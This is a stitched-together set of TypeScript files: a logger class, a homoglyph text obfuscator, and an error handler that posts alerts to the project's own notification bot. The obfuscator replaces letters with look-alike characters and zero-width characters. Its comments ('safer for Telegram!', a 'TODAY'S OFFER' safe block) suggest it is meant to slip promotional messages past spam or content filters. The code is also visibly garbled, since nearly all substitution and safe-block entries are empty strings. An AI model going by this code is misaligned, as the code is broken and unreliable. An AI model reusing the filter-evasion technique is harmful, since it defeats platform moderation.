stripAnsi(str: string): string {\n        return str.replace(/\\x1B\\[[0-9;]*m/g, \"\"); // remove colors for file logging\n    }\n\n    /** ---------- STATIC OVERRIDES ---------- */\n    static log(message: any, context?: string) {\n        new Logger(context).log(message, context);\n    }\n    static error(message: any, trace?: string, context?: string) {\n        new Logger(context).error(message, context, trace);\n    }\n    static warn(message: any, context?: string) {\n        new Logger(context).warn(message, context);\n    }\n    static debug(message: any, context?: string) {\n        new Logger(context).debug(message, context);\n    }\n    static verbose(message: any, context?: string) {\n        new Logger(context).verbose(message, context);\n    }\n    static success(message: any, context?: string) {\n        new Logger(context).success(message, context);\n    }\n\n    /** ---------- CONSOLE OVERRIDES ---------- */\n    static overrideConsole(serviceName = \"Console\") {\n        const instance = new Logger(serviceName);\n\n        console.log = (...args: any[]) => instance.log(args[0], args[1]);\n        console.info = (...args: any[]) => instance.info(args[0], args[1]);\n        console.error = (...args: any[]) => instance.error(args[0], args[1], args[2]);\n        console.warn = (...args: any[]) => instance.warn(args[0], args[1]);\n        console.debug = (...args: any[]) => instance.debug(args[0], args[1]);\n        (console as any).success = (...args: any[]) => instance.success(args[0], args[1]);\n    }\n}\n\nconst logger = new Logger()","/**\n * Enhanced Homoglyph Text Obfuscator - TypeScript Version\n * Converts text using homoglyphs (visually similar characters) with advanced features\n */\n\n// Type definitions\ntype HomoglyphMap = Record<string, string[]>;\ntype WeightArray = number[];\n\n\nconst DEFAULT_CONFIG: Required<ObfuscationOptions> = {\n    substitutionRate: 0.4,\n    invisibleCharRate: 0,\n    preserveCase: false,\n    preserveNumbers: false,\n    preserveSpecialChars: true,\n    useInvisibleChars: false, //  safer for Telegram!\n    maintainFormatting: true,\n    randomSeed: null,\n    maxInvisibleCharsPerWord: 2,\n    customSafeBlocks: [],\n    intensityVariation: false\n};\n\ninterface TextAnalysis {\n    totalChars: number;\n    letters: number;\n    numbers: number;\n    specialChars: number;\n    obfuscatableLetters: number;\n    obfuscatableNumbers: number;\n    obfuscatableSpecial: number;\n    lines: number;\n    words: number;\n}\n\ninterface ObfuscationOptions {\n    substitutionRate?: number;\n    invisibleCharRate?: number;\n    preserveCase?: boolean;\n    preserveNumbers?: boolean;\n    preserveSpecialChars?: boolean;\n    useInvisibleChars?: boolean;\n    maintainFormatting?: boolean;\n    randomSeed?: number | null;\n    maxInvisibleCharsPerWord?: number;\n    customSafeBlocks?: string[];\n    intensityVariation?: boolean;\n}\n\ninterface BatchResult {\n    config: ObfuscationConfig;\n    result: string;\n    analysisStats: TextAnalysis;\n}\n\n// Comprehensive homoglyph mapping with additional characters\nconst homoglyphMap: HomoglyphMap = {\n    a: ['', '', '', '', ''],\n    b: ['', '', '', '', ''],\n    c: ['', '', '', '', ''],\n    d: ['', '', '', '', ''],\n    e: ['', '', '', ''],\n    f: ['', '', '', '', ''],\n    g: ['', '', '', '', ''],\n    h: ['', '', ''],\n    i: ['', '', ''],\n    j: ['', '', '', '', '', ''],\n    k: ['', '', '', '', ''],\n    l: ['', '', '', ''],\n    m: ['', '', ''],\n    n: ['', '', '', '', '', ''],\n    o: ['', '', '', ''],\n    p: ['', '', '', '', '', ''],\n    q: ['', '', '', ''],\n    r: ['', '', '', '', ''],\n    s: ['', ''],\n    t: ['', '', '', ''],\n    u: ['', '', '', '', ''],\n    v: ['', '', '', '', ''],\n    w: ['', '', '', '', ''],\n    x: ['', '',],\n    y: ['', '', '', '', ''],\n    z: ['', '', '', '']\n};\n\n\n// Numbers homoglyphs\nconst numberMap: HomoglyphMap = {\n    '0': ['', '', '', '', '', ''],\n    '1': ['', '', '', '', ''],\n    '2': ['', '', '', '', ''],\n    '3': ['', '', '', '', '', '', ''],\n    '4': ['', '', '', '', '', ''],\n    '5': ['', '', '', '', '', ''],\n    '6': ['', '', '', '', '', ''],\n    '7': ['', '', '', '', '', ''],\n    '8': ['', '', '', '', ''],\n    '9': ['', '', '', '', '']\n};\n\n// Common special characters\nconst specialCharMap: HomoglyphMap = {\n    ' ': ['\\u2000', '\\u2001', '\\u2002', '\\u2003', '\\u2004', '\\u2005', '\\u2006', '\\u2007', '\\u2008', '\\u2009', '\\u200A', '\\u00A0'],\n    '.': ['', '', '', '', '', ''],\n    ',': ['', '', '', ''],\n    '!': ['', '', '', ''],\n    '?': ['', '', '', ''],\n    ':': ['', '', '', ''],\n    ';': ['', ''],\n    '-': ['', '', '', '', '', '', '', ''],\n    '(': ['', '', '', ''],\n    ')': ['', '', '', ''],\n    '[': ['', '', ''],\n    ']': ['', '', ''],\n    '{': ['', ''],\n    '}': ['', ''],\n    '\"': ['\"', '\"', '', '', ''],\n    \"'\": ['', '', '']\n};\n\n// Invisible and zero-width characters for advanced obfuscation\nconst invisibleChars: readonly string[] = [\n    '\\u200B', // Zero Width Space\n    '\\u200C', // Zero Width Non-Joiner\n    '\\u200D', // Zero Width Joiner\n    '\\u2060', // Word Joiner\n    '\\uFEFF', // Zero Width No-Break Space\n] as const;\n\n// Configuration class for obfuscation settings\nclass ObfuscationConfig {\n    public readonly substitutionRate: number;\n    public readonly invisibleCharRate: number;\n    public readonly preserveCase: boolean;\n    public readonly preserveNumbers: boolean;\n    public readonly preserveSpecialChars: boolean;\n    public readonly useInvisibleChars: boolean;\n    public readonly maintainFormatting: boolean;\n    public readonly randomSeed: number | null;\n    public readonly maxInvisibleCharsPerWord: number;\n    public readonly customSafeBlocks: readonly string[];\n    public readonly intensityVariation: boolean;\n\n    constructor(options: ObfuscationOptions = {}) {\n        const config = { ...DEFAULT_CONFIG, ...options };\n\n        this.substitutionRate = config.substitutionRate;\n        this.invisibleCharRate = config.invisibleCharRate;\n        this.preserveCase = config.preserveCase;\n        this.preserveNumbers = config.preserveNumbers;\n        this.preserveSpecialChars = config.preserveSpecialChars;\n        this.useInvisibleChars = config.useInvisibleChars;\n        this.maintainFormatting = config.maintainFormatting;\n        this.randomSeed = config.randomSeed;\n        this.maxInvisibleCharsPerWord = config.maxInvisibleCharsPerWord;\n        this.customSafeBlocks = Object.freeze([...config.customSafeBlocks]);\n        this.intensityVariation = config.intensityVariation;\n    }\n\n    public toJSON(): ObfuscationOptions {\n        return {\n            substitutionRate: this.substitutionRate,\n            invisibleCharRate: this.invisibleCharRate,\n            preserveCase: this.preserveCase,\n            preserveNumbers: this.preserveNumbers,\n            preserveSpecialChars: this.preserveSpecialChars,\n            useInvisibleChars: this.useInvisibleChars,\n            maintainFormatting: this.maintainFormatting,\n            randomSeed: this.randomSeed,\n            maxInvisibleCharsPerWord: this.maxInvisibleCharsPerWord,\n            customSafeBlocks: [...this.customSafeBlocks],\n            intensityVariation: this.intensityVariation\n        };\n    }\n}\n\n// Seeded random number generator for reproducible results\nclass SeededRandom {\n    private current: number;\n    private readonly seed: number;\n\n    constructor(seed: number | null = null) {\n        this.seed = seed ?? Math.random() * 2147483647;\n        this.current = this.seed;\n    }\n\n    public next(): number {\n        this.current = (this.current * 16807) % 2147483647;\n        return this.current / 2147483647;\n    }\n\n    public choice<T>(array: readonly T[]): T {\n        if (array.length === 0) {\n            throw new Error('Cannot choose from empty array');\n        }\n        return array[Math.floor(this.next() * array.length)];\n    }\n\n    public chance(probability: number): boolean {\n        return this.next() < probability;\n    }\n\n    public getSeed(): number {\n        return this.seed;\n    }\n\n    public reset(): void {\n        this.current = this.seed;\n    }\n}\n\n// Enhanced random selection with weighted preferences\nfunction getRandom<T>(arr: readonly T[], weights?: WeightArray | null): T {\n    if (arr.length === 0) {\n        throw new Error('Cannot select from empty array');\n    }\n\n    if (!weights) {\n        return arr[Math.floor(Math.random() * arr.length)];\n    }\n\n    if (weights.length !== arr.length) {\n        throw new Error('Weights array must have same length as choices array');\n    }\n\n    const totalWeight = weights.reduce((sum, weight) => sum + weight, 0);\n    if (totalWeight <= 0) {\n        throw new Error('Total weight must be positive');\n    }\n\n    let random = Math.random() * totalWeight;\n\n    for (let i = 0; i < arr.length; i++) {\n        if (random < weights[i]) {\n            return arr[i];\n        }\n        random -= weights[i];\n    }\n\n    return arr[arr.length - 1];\n}\n\n// Default safe blocks (text that shouldn't be obfuscated)\nconst defaultSafeBlocks: readonly string[] = [\n    '   ',\n    '',\n    '  T O D A Y \\' S   O F F E R  ',\n    '          ',\n    '', '', '', '',\n    '', '', '', '', '',\n    '', '', '', '', '',\n    '', '', '',\n    '', '', '', '', '',\n    '', '', '', '', ''\n] as const;\n\n/**\n * Main obfuscation function with enhanced features\n * @param text - The text to obfuscate\n * @param config - Configuration options\n * @returns Obfuscated text\n */\nexport function obfuscateText(text: string, config: ObfuscationOptions | ObfuscationConfig = {}): string {\n    const settings = config instanceof ObfuscationConfig ? config : new ObfuscationConfig(config);\n    const random = new SeededRandom(settings.randomSeed);\n    const safeBlocks = [...defaultSafeBlocks, ...settings.customSafeBlocks];\n\n    const specialCharCache = new Map<string, string>(); //  Cache special char replacements\n\n    let obfuscated = '';\n    const lines = text.split('\\n');\n\n    for (let j = 0; j < lines.length; j++) {\n        const line = lines[j].replace(/\\*\\*/g, '');\n\n        if (line.trim() === '') {\n            obfuscated += '\\n';\n            continue;\n        }\n\n        const isSafe = safeBlocks.some((safe: string) => line.includes(safe));\n        if (isSafe) {\n            obfuscated += line + '\\n';\n            continue;\n        }\n\n        let newLine = '';\n        let invisibleCharsInWord = 0;\n        let isInWord = false;\n\n        let currentSubstitutionRate = settings.substitutionRate;\n        if (settings.intensityVariation) {\n            const variation = (random.next() - 0.5) * 0.3;\n            currentSubstitutionRate = Math.max(0.1, Math.min(0.9, currentSubstitutionRate + variation));\n        }\n\n        for (let i = 0; i < line.length; i++) {\n            const c = line[i];\n            const lower = c.toLowerCase();\n            const isLetter = /[a-zA-Z]/.test(c);\n            const isNumber = /[0-9]/.test(c);\n            const isSpace = /\\s/.test(c);\n\n            if (isLetter || isNumber) {\n                if (!isInWord) {\n                    isInWord = true;\n                    invisibleCharsInWord = 0;\n                }\n            } else if (isSpace) {\n                isInWord = false;\n                invisibleCharsInWord = 0;\n            }\n\n            let substituted = false;\n\n            //  Letters\n            if (isLetter && homoglyphMap[lower] && random.chance(currentSubstitutionRate)) {\n                const substitute = random.choice(homoglyphMap[lower]);\n                newLine += settings.preserveCase && c === c.toUpperCase() ? substitute.toUpperCase() : substitute;\n                substituted = true;\n            }\n\n            //  Numbers\n            else if (isNumber && !settings.preserveNumbers && numberMap[c] && random.chance(currentSubstitutionRate)) {\n                newLine += random.choice(numberMap[c]);\n                substituted = true;\n            }\n\n            //  Special characters (cached)\n            else if (!isLetter && !isNumber && !isSpace && !settings.preserveSpecialChars &&\n                specialCharMap[c] && random.chance(currentSubstitutionRate * 0.3)) {\n\n                if (specialCharCache.has(c)) {\n                    newLine += specialCharCache.get(c);\n                } else {\n                    const sub = random.choice(specialCharMap[c]);\n                    specialCharCache.set(c, sub);\n                    newLine += sub;\n                }\n\n                substituted = true;\n            }\n\n            //  No substitution\n            else {\n                newLine += c;\n            }\n\n            //  Invisible char logic\n            if (settings.useInvisibleChars && isInWord && i > 0 &&\n                invisibleCharsInWord < settings.maxInvisibleCharsPerWord &&\n                (isLetter || isNumber) && random.chance(settings.invisibleCharRate)) {\n                newLine += random.choice(invisibleChars);\n                invisibleCharsInWord++;\n            }\n\n            // Extra obfuscation\n            if (settings.useInvisibleChars && substituted && random.chance(0.05)) {\n                newLine += random.choice(invisibleChars);\n            }\n        }\n\n        obfuscated += settings.maintainFormatting ? `**${newLine}**\\n` : newLine + '\\n';\n    }\n\n    return obfuscated.trim();\n}\n\n/**\n * Analyze text to show potential obfuscation options\n * @param text - Text to analyze\n * @returns Analysis results\n */\nexport function analyzeText(text: string): TextAnalysis {\n    const stats: TextAnalysis = {\n        totalChars: text.length,\n        letters: 0,\n        numbers: 0,\n        specialChars: 0,\n        obfuscatableLetters: 0,\n        obfuscatableNumbers: 0,\n        obfuscatableSpecial: 0,\n        lines: text.split('\\n').length,\n        words: text.split(/\\s+/).filter(word => word.length > 0).length\n    };\n\n    for (const char of text) {\n        const lower = char.toLowerCase();\n        if (/[a-zA-Z]/.test(char)) {\n            stats.letters++;\n            if (homoglyphMap[lower]) stats.obfuscatableLetters++;\n        } else if (/[0-9]/.test(char)) {\n            stats.numbers++;\n            if (numberMap[char]) stats.obfuscatableNumbers++;\n        } else if (!/\\s/.test(char)) {\n            stats.specialChars++;\n            if (specialCharMap[char]) stats.obfuscatableSpecial++;\n        }\n    }\n\n    return stats;\n}\n\n/**\n * Enhanced reverse obfuscation with better character mapping\n * @param obfuscatedText - Text to attempt to reverse\n * @returns Cleaned text with better character restoration\n */\nexport function attemptReverse(obfuscatedText: string): string {\n    let cleaned = obfuscatedText;\n\n    // Remove invisible characters first\n    invisibleChars.forEach((char: string) => {\n        cleaned = cleaned.replace(new RegExp(escapeRegExp(char), 'g'), '');\n    });\n\n    // Create comprehensive reverse mapping\n    const reverseMap: Record<string, string> = {};\n\n    // Build reverse mapping for letters (including case variations)\n    Object.entries(homoglyphMap).forEach(([original, substitutes]) => {\n        substitutes.forEach((substitute: string) => {\n            // Map lowercase substitute to lowercase original\n            reverseMap[substitute.toLowerCase()] = original.toLowerCase();\n            // Map uppercase substitute to uppercase original\n            reverseMap[substitute.toUpperCase()] = original.toUpperCase();\n            // Map the substitute as-is\n            reverseMap[substitute] = original;\n        });\n    });\n\n    // Build reverse mapping for numbers\n    Object.entries(numberMap).forEach(([original, substitutes]) => {\n        substitutes.forEach((substitute: string) => {\n            reverseMap[substitute] = original;\n        });\n    });\n\n    // Build reverse mapping for special characters\n    Object.entries(specialCharMap).forEach(([original, substitutes]) => {\n        substitutes.forEach((substitute: string) => {\n            reverseMap[substitute] = original;\n        });\n    });\n\n    // Sort by length (longest first) to avoid partial replacements\n    const sortedMappings = Object.entries(reverseMap)\n        .sort(([a], [b]) => b.length - a.length);\n\n    // Apply reverse mapping\n    for (const [obfuscated, original] of sortedMappings) {\n        if (obfuscated && original && cleaned.includes(obfuscated)) {\n            cleaned = cleaned.replace(new RegExp(escapeRegExp(obfuscated), 'g'), original);\n        }\n    }\n\n    // Additional cleanup for common Unicode normalizations\n    cleaned = cleaned.normalize('NFC');\n\n    // Remove extra formatting if maintainFormatting was used\n    cleaned = cleaned.replace(/\\*\\*(.*?)\\*\\*/g, '$1');\n\n    return cleaned;\n}\n\n/**\n * Alternative reverse function with fuzzy matching for better results\n * @param obfuscatedText - Text to attempt to reverse\n * @returns Cleaned text with fuzzy character restoration\n */\nexport function attemptReverseFuzzy(obfuscatedText: string): string {\n    let cleaned = obfuscatedText;\n\n    // Remove invisible characters\n    invisibleChars.forEach((char: string) => {\n        cleaned = cleaned.replace(new RegExp(escapeRegExp(char), 'g'), '');\n    });\n\n    // Character-by-character replacement with similarity scoring\n    let result = '';\n\n    for (let i = 0; i < cleaned.length; i++) {\n        const char = cleaned[i];\n        let bestMatch = char;\n        let found = false;\n\n        // Check letters\n        for (const [original, substitutes] of Object.entries(homoglyphMap)) {\n            if (substitutes.includes(char.toLowerCase())) {\n                bestMatch = char === char.toUpperCase() ? original.toUpperCase() : original;\n                found = true;\n                break;\n            }\n        }\n\n        // Check numbers if not found\n        if (!found) {\n            for (const [original, substitutes] of Object.entries(numberMap)) {\n                if (substitutes.includes(char)) {\n                    bestMatch = original;\n                    found = true;\n                    break;\n                }\n            }\n        }\n\n        // Check special characters if not found\n        if (!found) {\n            for (const [original, substitutes] of Object.entries(specialCharMap)) {\n                if (substitutes.includes(char)) {\n                    bestMatch = original;\n                    found = true;\n                    break;\n                }\n            }\n        }\n\n        result += bestMatch;\n    }\n\n    // Final cleanup\n    result = result.normalize('NFC');\n    result = result.replace(/\\*\\*(.*?)\\*\\*/g, '$1');\n\n    return result;\n}\n\n/**\n * Test function to verify reverse mapping coverage\n * @returns Object with coverage statistics\n */\nexport function testReverseCoverage(): {\n    letters: { total: number; mapped: number; coverage: number };\n    numbers: { total: number; mapped: number; coverage: number };\n    special: { total: number; mapped: number; coverage: number };\n} {\n    const reverseMap: Record<string, string> = {};\n\n    // Build reverse map\n    Object.entries(homoglyphMap).forEach(([original, substitutes]) => {\n        substitutes.forEach(sub => { reverseMap[sub] = original; });\n    });\n    Object.entries(numberMap).forEach(([original, substitutes]) => {\n        substitutes.forEach(sub => { reverseMap[sub] = original; });\n    });\n    Object.entries(specialCharMap).forEach(([original, substitutes]) => {\n        substitutes.forEach(sub => { reverseMap[sub] = original; });\n    });\n\n    const letterSubs = Object.values(homoglyphMap).flat();\n    const numberSubs = Object.values(numberMap).flat();\n    const specialSubs = Object.values(specialCharMap).flat();\n\n    const lettersMapped = letterSubs.filter(sub => reverseMap[sub]).length;\n    const numbersMapped = numberSubs.filter(sub => reverseMap[sub]).length;\n    const specialMapped = specialSubs.filter(sub => reverseMap[sub]).length;\n\n    return {\n        letters: {\n            total: letterSubs.length,\n            mapped: lettersMapped,\n            coverage: (lettersMapped / letterSubs.length) * 100\n        },\n        numbers: {\n            total: numberSubs.length,\n            mapped: numbersMapped,\n            coverage: (numbersMapped / numberSubs.length) * 100\n        },\n        special: {\n            total: specialSubs.length,\n            mapped: specialMapped,\n            coverage: (specialMapped / specialSubs.length) * 100\n        }\n    };\n}\n/**\n * Escape RegExp special characters in a string\n * @param str - String to escape\n * @returns Escaped string\n */\nfunction escapeRegExp(str: string): string {\n    return str.replace(/[.*+?^${}()|[\\]\\\\]/g, '\\\\$&');\n}\n\n/**\n * Batch obfuscation with different settings\n * @param text - Text to obfuscate\n * @param configArray - Array of configuration objects\n * @returns Array of batch results\n */\nexport function batchObfuscate(text: string, configArray: (ObfuscationOptions | ObfuscationConfig)[]): BatchResult[] {\n    return configArray.map(config => {\n        const configObj = config instanceof ObfuscationConfig ? config : new ObfuscationConfig(config);\n        const result = obfuscateText(text, configObj);\n        const analysisStats = analyzeText(result);\n\n        return {\n            config: configObj,\n            result,\n            analysisStats\n        };\n    });\n}\n\n/**\n * Generate multiple variants with different intensity levels\n * @param text - Text to obfuscate\n * @param baseConfig - Base configuration\n * @param variants - Number of variants to generate\n * @returns Array of obfuscated variants\n */\nexport function generateVariants(\n    text: string,\n    baseConfig: ObfuscationOptions = {},\n    variants: number = 5\n): string[] {\n    const results: string[] = [];\n    const config = new ObfuscationConfig(baseConfig);\n\n    for (let i = 0; i < variants; i++) {\n        const intensity = (i + 1) / variants;\n        const variantConfig = new ObfuscationConfig({\n            ...config.toJSON(),\n            substitutionRate: intensity * 0.8,\n            invisibleCharRate: intensity * 0.15,\n            randomSeed: Math.floor(Math.random() * 1000000)\n        });\n\n        results.push(obfuscateText(text, variantConfig));\n    }\n\n    return results;\n}\n\n/**\n * Validate obfuscation configuration\n * @param config - Configuration to validate\n * @throws Error if configuration is invalid\n */\nexport function validateConfig(config: ObfuscationOptions): void {\n    if (config.substitutionRate !== undefined && (config.substitutionRate < 0 || config.substitutionRate > 1)) {\n        throw new Error('substitutionRate must be between 0 and 1');\n    }\n\n    if (config.invisibleCharRate !== undefined && (config.invisibleCharRate < 0 || config.invisibleCharRate > 1)) {\n        throw new Error('invisibleCharRate must be between 0 and 1');\n    }\n\n    if (config.maxInvisibleCharsPerWord !== undefined && config.maxInvisibleCharsPerWord < 0) {\n        throw new Error('maxInvisibleCharsPerWord must be non-negative');\n    }\n}\n\n// Export configuration class and utilities\nexport {\n    ObfuscationConfig,\n    SeededRandom,\n    homoglyphMap,\n    numberMap,\n    specialCharMap,\n    invisibleChars,\n    type HomoglyphMap,\n    type TextAnalysis,\n    type ObfuscationOptions,\n    type BatchResult\n};\n","import { notifbot } from \"./logbots\";\r\nimport axios, { AxiosError, AxiosResponse } from \"axios\";\r\n\r\n/**\r\n * Error response interface for standardized error format\r\n */\r\ninterface ErrorResponse {\r\n  status: number;\r\n  message: string;\r\n  error: string;\r\n  raw?: any;\r\n}\r\n\r\n/**\r\n * Configuration options for error handling\r\n */\r\ninterface ErrorHandlingConfig {\r\n  maxMessageLength: number;\r\n  notificationTimeout: number;\r\n  ignorePatterns: RegExp[];\r\n  defaultStatus: number;\r\n  defaultMessage: string;\r\n  defaultError: string;\r\n}\r\n\r\n// Default configuration for error handling\r\nconst DEFAULT_ERROR_CONFIG: ErrorHandlingConfig = {\r\n  maxMessageLength: 200,\r\n  notificationTimeout: 10000,\r\n  ignorePatterns: [\r\n    /INPUT_USER_DEACTIVATED/i,\r\n    /too many req/i,\r\n    /could not find/i,\r\n    /ECONNREFUSED/i\r\n  ],\r\n  defaultStatus: 500,\r\n  defaultMessage: 'An unknown error occurred',\r\n  defaultError: 'UnknownError'\r\n};\r\n\r\n/**\r\n * Safely stringifies objects of any depth\r\n * @param data - Data to stringify\r\n * @param depth - Current recursion depth\r\n * @param maxDepth - Maximum recursion depth\r\n * @returns String representation of data\r\n */\r\nfunction safeStringify(data: any, depth = 0, maxDepth = 3): string {\r\n  if (depth > maxDepth) {\r\n    return '[Max Depth Reached]';\r\n  }\r\n\r\n  try {\r\n    if (data === null || data === undefined) {\r\n      return String(data);\r\n    }\r\n\r\n    if (typeof data === 'string' || typeof data === 'number' || typeof data === 'boolean') {\r\n      return String(data);\r\n    }\r\n\r\n    if (data instanceof Error) {\r\n      return data.message || data.toString();\r\n    }\r\n\r\n    if (Array.isArray(data)) {\r\n      if (data.length === 0) return '[]';\r\n      return `[${data.map(item => safeStringify(item, depth + 1, maxDepth)).join(', ')}]`;\r\n    }\r\n\r\n    if (typeof data === 'object') {\r\n      const entries = Object.entries(data)\r\n        .filter(([_, v]) => v !== undefined && v !== null)\r\n        .map(([k, v]) => `${k}: ${safeStringify(v, depth + 1, maxDepth)}`);\r\n\r\n      if (entries.length === 0) return '{}';\r\n      return `{${entries.join(', ')}}`;\r\n    }\r\n\r\n    return String(data);\r\n  } catch (error) {\r\n    return `[Error Stringifying: ${error instanceof Error ? error.message : String(error)}]`;\r\n  }\r\n}\r\n\r\n/**\r\n * Extracts meaningful message from nested data structure\r\n * @param data - The data to extract messages from\r\n * @param path - Current object path for nested values\r\n * @param maxDepth - Maximum depth to traverse\r\n * @returns Extracted message as string\r\n */\r\nexport function extractMessage(data: any, path = '', depth = 0, maxDepth = 5): string {\r\n  try {\r\n    // Prevent excessive recursion\r\n    if (depth > maxDepth) {\r\n      return `${path}=[Max Depth Reached]`;\r\n    }\r\n\r\n    // Handle simple types directly\r\n    if (data === null || data === undefined) {\r\n      return '';\r\n    }\r\n\r\n    if (typeof data === 'string' || typeof data === 'number' || typeof data === 'boolean') {\r\n      return path ? `${path}=${data}` : String(data);\r\n    }\r\n\r\n    // Handle Error objects\r\n    if (data instanceof Error) {\r\n      const errorInfo = [\r\n        data.message ? `message=${data.message}` : '',\r\n        data.name ? `name=${data.name}` : '',\r\n        data.stack ? `stack=${data.stack.split('\\n')[0]}` : ''\r\n      ].filter(Boolean).join('\\n');\r\n\r\n      return path ? `${path}=(${errorInfo})` : errorInfo;\r\n    }\r\n\r\n    // Handle arrays\r\n    if (Array.isArray(data)) {\r\n      if (data.length === 0) {\r\n        return '';\r\n      }\r\n\r\n      return data\r\n        .map((item, index) => extractMessage(item, path ? `${path}[${index}]` : `[${index}]`, depth + 1, maxDepth))\r\n        .filter(Boolean)\r\n        .join('\\n');\r\n    }\r\n\r\n    // Handle objects\r\n    if (typeof data === 'object') {\r\n      const messages: string[] = [];\r\n\r\n      for (const key of Object.keys(data)) {\r\n        const value = data[key];\r\n        const newPath = path ? `${path}.${key}` : key;\r\n\r\n        const extracted = extractMessage(value, newPath, depth + 1, maxDepth);\r\n        if (extracted) {\r\n          messages.push(extracted);\r\n        }\r\n      }\r\n\r\n      return messages.join('\\n');\r\n    }\r\n\r\n    // Fallback\r\n    return '';\r\n  } catch (error) {\r\n    console.error(\"Error in extractMessage:\", error);\r\n    return `Error extracting message: ${error instanceof Error ? error.message : String(error)}`;\r\n  }\r\n}\r\n\r\n/**\r\n * Sends an HTTP notification\r\n * @param url - URL to send notification to\r\n * @param timeout - Request timeout in ms\r\n * @returns Promise resolving to response or undefined on error\r\n */\r\nasync function sendNotification(url: string, timeout = DEFAULT_ERROR_CONFIG.notificationTimeout): Promise<AxiosResponse | undefined> {\r\n  try {\r\n    // Validate URL before sending\r\n    if (!url || typeof url !== 'string' || !url.startsWith('http')) {\r\n      console.error(\"Invalid notification URL:\", url);\r\n      return undefined;\r\n    }\r\n\r\n    return await axios.get(url, {\r\n      timeout,\r\n      validateStatus: status => status < 500 // Consider 4xx as \"successful\" notifications\r\n    });\r\n  } catch (error) {\r\n    console.error(\"Failed to send notification:\", error instanceof Error ? error.message : String(error));\r\n    return undefined;\r\n  }\r\n}\r\n\r\n/**\r\n * Checks if an error should be ignored for notification\r\n * @param message - Error message to check\r\n * @param status - HTTP status code\r\n * @param patterns - RegExp patterns to ignore\r\n * @returns Boolean indicating if error should be ignored\r\n */\r\nfunction shouldIgnoreError(message: string, status: number, patterns: RegExp[]): boolean {\r\n  if (status === 429) return true;  // Always ignore rate limiting errors\r\n\r\n  return patterns.some(pattern => pattern.test(message));\r\n}\r\n\r\n/**\r\n * Extracts status code from error or response object\r\n * @param err - Error object to parse\r\n * @param defaultStatus - Default status code if none found\r\n * @returns HTTP status code\r\n */\r\nfunction extractStatusCode(err: any, defaultStatus: number): number {\r\n  if (!err) return defaultStatus;\r\n\r\n  // Try to extract from response\r\n  if (err.response) {\r\n    const response = err.response;\r\n    return response.data?.statusCode ||\r\n      response.data?.status ||\r\n      response.data?.ResponseCode ||\r\n      response.status ||\r\n      err.status ||\r\n      defaultStatus;\r\n  }\r\n\r\n  // Try direct properties\r\n  return err.statusCode || err.status || defaultStatus;\r\n}\r\n\r\n/**\r\n * Extracts error message from error or response object\r\n * @param err - Error object to parse\r\n * @param defaultMessage - Default message if none found\r\n * @returns Extracted error message\r\n */\r\nfunction extractErrorMessage(err: any, defaultMessage: string): string {\r\n  if (!err) return defaultMessage;\r\n\r\n  // Error message from response\r\n  if (err.response?.data) {\r\n    const responseData = err.response.data;\r\n    return responseData.message ||\r\n      responseData.errors ||\r\n      responseData.ErrorMessage ||\r\n      responseData.errorMessage ||\r\n      responseData.UserMessage ||\r\n      (typeof responseData === 'string' ? responseData : null) ||\r\n      err.response.statusText ||\r\n      err.message ||\r\n      defaultMessage;\r\n  }\r\n\r\n  // Error message from request\r\n  if (err.request) {\r\n    return err.data?.message ||\r\n      err.data?.errors ||\r\n      err.data?.ErrorMessage ||\r\n      err.data?.errorMessage ||\r\n      err.data?.UserMessage ||\r\n      (typeof err.data === 'string' ? err.data : null) ||\r\n      err.message ||\r\n      err.statusText ||\r\n      'The request was triggered but no response was received';\r\n  }\r\n\r\n  // Direct error message\r\n  return err.message || err.errorMessage || defaultMessage;\r\n}\r\n\r\n/**\r\n * Extracts error type from error or response object\r\n * @param err - Error object to parse\r\n * @param defaultError - Default error type if none found\r\n * @returns Error type as string\r\n */\r\nfunction extractErrorType(err: any, defaultError: string): string {\r\n  if (!err) return defaultError;\r\n\r\n  if (err.response?.data?.error) {\r\n    return err.response.data.error;\r\n  }\r\n\r\n  return err.error || err.name || err.code || defaultError;\r\n}\r\n\r\n/**\r\n * Parses and standardizes error objects for consistent handling\r\n * @param err - Error to parse\r\n * @param prefix - Prefix to add to error message\r\n * @param sendErr - Whether to send a notification for this error\r\n * @param config - Error handling configuration\r\n * @returns Standardized error response\r\n */\r\nexport function parseError(\r\n  err: any,\r\n  prefix?: string,\r\n  sendErr: boolean = true,\r\n  config: Partial<ErrorHandlingConfig> = {}\r\n): ErrorResponse {\r\n  // Merge with default config\r\n  const fullConfig = { ...DEFAULT_ERROR_CONFIG, ...config };\r\n\r\n  try {\r\n    const clientId = process.env.clientId || process.env.serviceName;\r\n    const prefixStr = `${clientId}${prefix ? ` - ${prefix}` : ''}`;\r\n\r\n    // Extract error components\r\n    const status = extractStatusCode(err, fullConfig.defaultStatus);\r\n    const rawMessage = extractErrorMessage(err, fullConfig.defaultMessage);\r\n    const error = extractErrorType(err, fullConfig.defaultError);\r\n\r\n    // Process the raw message to get a clean version\r\n    let extractedMessage;\r\n    try {\r\n      extractedMessage = typeof rawMessage === 'string' ? rawMessage : extractMessage(rawMessage);\r\n    } catch (e) {\r\n      extractedMessage = safeStringify(rawMessage) || 'Error extracting message';\r\n    }\r\n\r\n    // Prepare the full message for logging\r\n    const fullMessage = `${prefixStr} :: ${extractedMessage}`;\r\n    console.error(\"parsedErr: \", fullMessage);\r\n\r\n    // Prepare response object\r\n    const response: ErrorResponse = {\r\n      status,\r\n      message: err.errorMessage ? err.errorMessage : String(fullMessage).slice(0, fullConfig.maxMessageLength),\r\n      error,\r\n      raw: err\r\n    };\r\n\r\n    // Send notification if requested and applicable\r\n    if (sendErr) {\r\n      try {\r\n        const ignoreError = shouldIgnoreError(fullMessage, status, fullConfig.ignorePatterns);\r\n\r\n        if (!ignoreError) {\r\n          const notificationMessage = err.errorMessage ? err.errorMessage : extractedMessage;\r\n          const notifUrl = `${notifbot()}&text=${encodeURIComponent(prefixStr)} :: ${encodeURIComponent(notificationMessage)}`;\r\n\r\n          // Use Promise but don't await to avoid delaying the response\r\n          sendNotification(notifUrl, fullConfig.notificationTimeout)\r\n            .catch(e => console.error(\"Failed to send error notification:\", e));\r\n        }\r\n      } catch (notificationError) {\r\n        console.error('Failed to prepare error notification:', notificationError);\r\n      }\r\n    }\r\n\r\n    return response;\r\n  } catch (fatalError) {\r\n    console.error(\"Fatal error in parseError:\", fatalError);\r\n    return {\r\n      status: fullConfig.defaultStatus,\r\n      message: \"Error in error handling\",\r\n      error: \"FatalError\",\r\n      raw: err\r\n    };\r\n  }\r\n}\r\n\r\n/**\r\n * Type guard for Axios errors\r\n * @param error - Error to check\r\n * @returns Boolean indicating if error is an Axios error\r\n */\r\nexport function isAxiosError(error: unknown): error is AxiosError {\r\n  